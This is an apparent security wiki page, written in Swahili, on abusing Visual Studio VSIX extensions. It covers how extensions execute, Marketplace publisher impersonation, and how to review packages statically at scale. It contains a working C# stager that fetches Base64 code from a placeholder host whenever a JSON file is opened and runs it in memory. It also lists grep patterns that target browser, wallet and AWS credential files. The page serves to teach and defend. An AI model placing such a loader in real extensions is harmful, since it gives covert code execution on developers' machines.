# Matumizi Mabaya ya Kiendelezi cha Visual Studio VSIX

{{#include ../banners/hacktricks-training.md}}

Kiendelezi cha Visual Studio kinaweza kubadilisha shughuli za kawaida za kihariri kuwa utekelezaji wa code chini ya utambulisho wa mtumiaji aliyeingia. VSIX hasidi, publisher anayeiga mwingine, au sasisho la kiendelezi lililodukuliwa vinaweza kumfikia mtumiaji kupitia njia za kawaida za usakinishaji. Usakinishaji unaohitaji ruhusa ya msimamizi ni njia ya usakinishaji iliyoidhinishwa na mtumiaji, si kupandishwa kwa marupurupu kiotomatiki.<sup>[[1]](#references)</sup>

## Muundo wa utekelezaji

Viendelezi vya kawaida vya VSSDK mara nyingi hutekelezwa ndani ya `devenv.exe`. Muundo mpya zaidi wa `VisualStudio.Extensibility` huendesha hasa viendelezi vya kisasa vya .NET nje ya mchakato: Visual Studio huelekeza miito kwenye mchakato maalum wa `Microsoft.ServiceHub.Host.Extensibility`, ili kulinda uthabiti wa IDE, lakini **hauweki kiendelezi kwenye sandbox dhidi ya ruhusa za Windows za mtumiaji**. Jina halisi la faili inayotekelezwa linaweza kuwa na kiambishi tamati cha usanifu, kama vile `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Kuwasha kiendelezi kupitia shughuli za kawaida za kihariri

Badala ya kutoa amri ya menyu inayoonekana wazi pekee, kiendelezi kinaweza kutekeleza `ITextViewOpenClosedListener`. Callback yake ya `TextViewOpenedAsync` huitwa kwa hati zinazolingana, huku `TextViewExtensionConfiguration.AppliesTo` ikiruhusu kuweka kikomo cha kuwashwa kwa aina ya kawaida kama JSON. Formatter au linter halisi bado inaweza kutekeleza kazi inayotangazwa, huku kitendo cha pili kikitekelezwa kama athari ya pembeni wakati faili inafunguliwa.<sup>[[1]](#references)[[3]](#references)</sup>

Muundo ufuatao uliorahisishwa unaonyesha sehemu muhimu za utekelezaji; umeacha formatter halali na ushughulikiaji wa makosa kwa ajili ya ufupi.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Kipakiaji cha assembly ya managed kinachotumia kumbukumbu na kuwashwa na tukio</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Msururu huu hupakua maandishi ya Base64, huyafungua na kuyabadilisha kuwa byte za assembly, huyapakia kutoka kwenye `MemoryStream` kupitia `AssemblyLoadContext` inayoweza kuondolewa, huita `EntryPoint` iliyopatikana kwa reflection ikiwa na vigezo sifuri au `string[]`, husubiri entry point za asynchronous, kisha huondoa context. Hatua ya pili haiandikwi kwenye diski, ingawa VSIX na DLL kuu ya extension hubaki kama mabaki kwenye diski. Base64 haitoi uthibitishaji wala usiri; kutumia HTTP pia huruhusu attacker aliye kwenye njia kubadilisha jibu.<sup>[[1]](#references)</sup>

Tofauti za utekelezaji ni pamoja na kukandamiza exceptions zote ili kipengele kilichoahidiwa kiendelee kufanya kazi staging inaposhindwa, au kutumia `ITextViewChangedListener` ili kuanzisha utekelezaji baada ya mabadiliko. Code hutekelezwa kwenye extension host na inaweza kutumia managed APIs, P/Invoke, faili, credentials na michakato tanzu inayopatikana kwa mtumiaji huyo.<sup>[[1]](#references)</sup>

Kwa sehemu nyingine ya utekelezaji inayohusu editor mahususi na inayotegemea upakiaji otomatiki wa native plugins, tazama:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Matumizi mabaya ya uaminifu wa Marketplace na usambazaji

VSIX inaweza kufika kama faili iliyoshirikiwa moja kwa moja/iliyotumwa kwa phishing, kutoka kwenye Marketplace ya wavuti, au kupitia kivinjari cha Marketplace kilichojumuishwa kwenye Visual Studio. Usajili wa publisher unaosisitiza zaidi upekee na orodha ya maneno yaliyohifadhiwa unaweza kuruhusu utambulisho wa publisher unaofanana kwa macho; kumiliki publisher au extension ambayo tayari inaaminika kuna ufanisi zaidi kwa sababu inarithi msingi wa watumiaji walioisakinisha. Usakinishaji wa Marketplace huita Visual Studio Installer na huweka kwa muda VSIX iliyopakuliwa chini ya `%LOCALAPPDATA%\Temp`; `payload.vsix` pia hutumika kihalali, kwa hiyo jina la faili pekee si kiashiria.<sup>[[1]](#references)</sup>

MDSec haikutambua URL protocol ya Visual Studio inayosakinisha extension moja kwa moja. Operator bado anahitaji mtumiaji asakinishe/aiamini VSIX, au lazima ahatarishe njia ya usambazaji ya extension iliyopo. Package ya `AllUsers` husakinishwa chini ya folda ya usakinishaji wa Visual Studio na inaweza kuomba ruhusa za juu, lakini huu ni utaratibu wa kawaida wa installer unaohitaji idhini, si njia ya kiotomatiki ya kupata ruhusa za administrator au SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Ukaguzi tuli kwa kiwango kikubwa

Packages za VSIX kwa kawaida ni ZIP containers, kwa hiyo pipeline salama ya ukaguzi wa Marketplace inaweza kuorodhesha packages, kuzifungua **bila kupakia code ya extension**, kuchanganua manifests, kubaini sehemu zinazoweza kutekeleza code, na ku-decompile managed assemblies kwa `ilspycmd`. Zipe kipaumbele assemblies zinazomilikiwa na extension baada ya kuondoa dependencies za kawaida zilizojumuishwa, kisha linganisha mifuatano ya credential store na makundi ya tabia kama kusoma faili pamoja na kutuma kwenye mtandao, encode pamoja na kutuma, kupakua pamoja na kutekeleza, ufikiaji wa credential manager pamoja na mtandao, au kupiga picha ya skrini pamoja na kutuma.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Pia orodhesha native DLLs, MSBuild targets, scripts, T4 templates na installer payloads badala ya kudhani kwamba kila sehemu ya utekelezaji ni managed code. Linganisha tabia zinazotia shaka na madhumuni yanayodaiwa kwenye manifest; telemetry na legitimate updaters zinaweza kufanana na exfiltration au staging. Ukaguzi wa static-only hukosa code iliyopakiwa, iliyofichwa, inayotatuliwa dynamically na isiyotumika kwa sasa, na kukagua toleo la hivi karibuni pekee hukosa matoleo ya zamani hasidi.<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Visual Studio Extensions Zimechunguzwa Tena](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Kuhusu VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Muundo wa kifurushi cha VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - zana ya .NET ya ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
